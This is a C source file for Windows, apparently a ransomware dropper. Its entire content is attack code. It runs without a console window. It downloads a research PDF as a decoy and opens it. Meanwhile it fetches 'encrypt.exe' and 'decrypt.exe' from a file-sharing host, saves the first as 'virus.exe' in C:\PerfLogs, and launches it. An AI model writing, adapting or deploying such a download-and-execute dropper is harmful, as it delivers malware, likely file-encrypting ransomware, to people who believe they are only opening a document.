#include <Windows.h>
#include <urlmon.h>
#include <stdio.h>

#pragma comment(lib, "urlmon.lib")
#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")

// Uses URLDownloadToFileW to download and save a file from the internet
int downloadFile(WCHAR* downloadUrl, WCHAR* fileName) {
    printf("Downloading the file (%ws) from (%ws)...\n", fileName, downloadUrl);
    return URLDownloadToFileW(NULL, downloadUrl, fileName, 0, NULL);
}

int main(void) {
    // Initializing our variables
    WCHAR virusUrl[] = TEXT(L"https://srv-store5.gofile.io/download/ce0N45/encrypt.exe");
    WCHAR virusName[] = TEXT(L"C:\\PerfLogs\\virus.exe");
    WCHAR decryptUrl[] = TEXT(L"https://srv-store5.gofile.io/download/ce0N45/decrypt.exe");
    WCHAR decryptName[] = TEXT(L"C:\\PerfLogs\\decrypt.exe");
    WCHAR pdfUrl[] = TEXT(L"https://www.researchgate.net/profile/Chinelo_Igwenagu2/publication/303381524_Fundamentals_of_research_methodology_and_data_collection/links/573f30ad08ae9ace84133f93/Fundamentals-of-research-methodology-and-data-collection.pdf");
    WCHAR pdfName[] = TEXT(L"C:\\PerfLogs\\ResearchOnHumanReflexe.pdf");
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    ZeroMemory(&pi, sizeof(pi));

    // Downloading the pdf
    downloadFile(pdfUrl, pdfName);

    // Downloading the virus
    downloadFile(virusUrl, virusName);
    downloadFile(decryptUrl, decryptName);

    // Opening PDF
    SHELLEXECUTEINFOW sei = { sizeof(sei) };
    sei.lpFile = pdfName;
    sei.lpVerb = L"open";
    sei.nShow = SW_SHOWNORMAL;
    ShellExecuteExW(&sei);

    // Creating new process and executing the file
    if (!CreateProcessW(virusName, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        printf("CreateProcess failed (%lu).\n", GetLastError());
        return 1;
    }
    else {
        // Wait until child process exits.
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    return 0;
}